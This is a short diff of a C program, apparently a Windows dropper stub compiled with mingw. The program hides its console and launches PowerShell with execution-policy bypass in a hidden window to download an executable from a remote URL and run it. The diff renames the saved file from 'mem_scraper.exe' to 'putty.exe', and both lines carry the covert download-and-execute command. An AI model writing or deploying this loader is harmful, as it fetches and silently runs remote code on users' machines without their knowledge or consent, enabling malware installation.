@@ -18,6 +18,6 @@ $ i586-mingw32msvc-gcc main.c -o main.exe -lws2_32
 
 int main(int argc, char *argv[]) {
 FreeConsole();
- ShellExecute(NULL,NULL, "powershell.exe", "-exec bypass -Command (New-Object Net.WebClient).DownloadFile('http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe','mem_scraper.exe');./putty.exe;",NULL,SW_HIDE);
+ ShellExecute(NULL,NULL, "powershell.exe", "-exec bypass -Command (New-Object Net.WebClient).DownloadFile('http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe','putty.exe');./putty.exe;",NULL,SW_HIDE);
 exit(0);
 }
